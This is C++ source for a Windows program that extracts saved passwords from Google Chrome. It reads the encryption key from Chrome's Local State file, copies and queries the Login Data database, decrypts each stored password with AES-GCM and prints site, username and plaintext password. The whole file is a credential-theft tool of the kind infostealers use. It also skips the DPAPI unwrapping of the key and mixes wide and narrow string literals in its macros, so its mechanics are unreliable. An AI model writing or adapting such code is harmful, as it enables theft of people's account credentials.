#include "sqlite3.h"
#include "aes_gcm.h"
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <shlobj.h>
#include <ntstatus.h>
#include <string>
#include <iostream>
#include "json.hpp"

#define CHROME_USER_DATA L"\\Google\\Chrome\\User Data"
#define CHROME_LOCAL_STATE CHROME_USER_DATA##"\\Local State"
#define CHROME_USER_LOGIN CHROME_USER_DATA##"\\Default\\Login Data"
#define CHROME_USER_COOKIES CHROME_USER_DATA##"\\Default\\Cookies"
#define TEMP_DB_LOC L".\\~tempfile"

using namespace nlohmann;

int wmain()
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    LPWSTR appDataLocal = new WCHAR[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataLocal) != S_OK)
    {
        wprintf(L"Failed to find local appdata folder!\n");
        return -1;
    }
    LPWSTR chromeSettings = new WCHAR[MAX_PATH]; 
    lstrcpy(chromeSettings, appDataLocal);
    chromeSettings = lstrcat(chromeSettings, CHROME_LOCAL_STATE);
    std::ifstream chromeLocalStateFile(chromeSettings);
    json chromeSettingsJsonified = json::parse(chromeLocalStateFile);
    std::string key = chromeSettingsJsonified["os_crypt"]["encrypted_key"].get<std::string>();
    LPWSTR chromePasswordsDB = new WCHAR[MAX_PATH];
    lstrcpy(chromePasswordsDB, appDataLocal);
    chromePasswordsDB = lstrcat(chromePasswordsDB, CHROME_USER_LOGIN);

    CopyFile(chromePasswordsDB, TEMP_DB_LOC);
    DWORD binaryKeyLength = 0;
    std::vector<BYTE> binaryKeyData;

    if(!(status = CryptStringToBinaryA(key.data(), key.size(), CRYPT_STRING_BASE64, NULL, &binaryKeyLength, NULL, NULL))) {
        wprintf(L"Failed to derive security key!\n");
        return -1;
    }
    binaryKeyData.resize(binaryKeyLength);
    if(!(status = CryptStringToBinaryA(key.data(), key.size(), CRYPT_STRING_BASE64, &binaryKeyData[0], &binaryKeyLength, NULL, NULL))) {
        wprintf(L"Failed to derive security key!\n");
        return -1;
    }
    auto box = new AESGCM(binaryKeyData.data());
    sqlite3 *db = NULL;
    sqlite3_stmt *query = NULL;
    if((status = sqlite3_open_v2("~tempfile", &db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK){
        wprintf(L"Failed to open db\n");
        DeleteFile(TEMP_DB_LOC);
        return -1;
    }
    if((status = sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &query, 0)) != SQLITE_OK){
        wprintf(L"Failed to query data!\n");
        sqlite3_close(db);
        DeleteFile(TEMP_DB_LOC);
        return -1;
    }
    while(sqlite3_step(query) == SQLITE_ROW){
        std::string url = (const char *)sqlite3_column_text(query, 0);
        std::string login = (const char *)sqlite3_column_text(query, 1);
        std::string hashed_password = (const char *)sqlite3_column_text(query, 2);
        std::string iv(hashed_password.begin() + 3, hashed_password.begin() + 15);
        std::string ciphertext(hashed_password.begin() + 15, hashed_password.end() - 16);
        std::string mac(hashed_password.end() - 16, hashed_password.end());
        box->Decrypt(iv.data(), iv.size(), ciphertext.data(), ciphertext.size(), mac.data(), mac.size());
        wprintf(L"%s\t\t%s\t\t%s\n", url.data(), login.data(), box->plaintext);
    }
    sqlite3_finalize(query);
    sqlite3_close(db);
    DeleteFile(TEMP_DB_LOC);
    return 0;
}